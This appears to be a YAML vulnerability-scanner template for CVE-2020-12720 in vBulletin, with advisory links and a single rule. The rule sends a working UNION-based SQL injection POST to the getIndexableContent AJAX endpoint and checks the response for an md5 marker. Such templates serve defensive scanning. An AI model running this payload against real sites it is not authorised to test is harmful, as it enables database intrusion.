name: yaml-poc-vbulletin-vbulletin-unauthorized_access-CVE-2020-12720
binding: cf7670ae-ff6f-4da2-9e9a-3036034a6359
detail:
    author: Ð¡z
    links:
        - http://packetstormsecurity.com/files/157716/vBulletin-5.6.1-SQL-Injection.html
        - http://packetstormsecurity.com/files/157904/vBulletin-5.6.1-SQL-Injection.html
        - https://attackerkb.com/topics/RSDAFLik92/cve-2020-12720-vbulletin-incorrect-access-control
        - https://cxsecurity.com/issue/WLB-2020050139
        - https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1
        - https://nvd.nist.gov/vuln/detail/CVE-2020-12720
        - https://packetstormsecurity.com/files/157716/vBulletin-5.6.1-SQL-Injection.html
        - https://packetstormsecurity.com/files/157904/vBulletin-5.6.1-SQL-Injection.html
    vulnerability:
        id: 8a13d250-3870-4fbd-b6b3-39505f36bbf2
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000, 999999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ajax/api/content_infraction/getIndexableContent
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: nodeId[nodeid]=1 AND text.nodeid = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,md5({{s1}}),19,20,21,22,23,24,25,26%23
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains(substr(md5(string(s1)), 2, 26))
expression: r0()
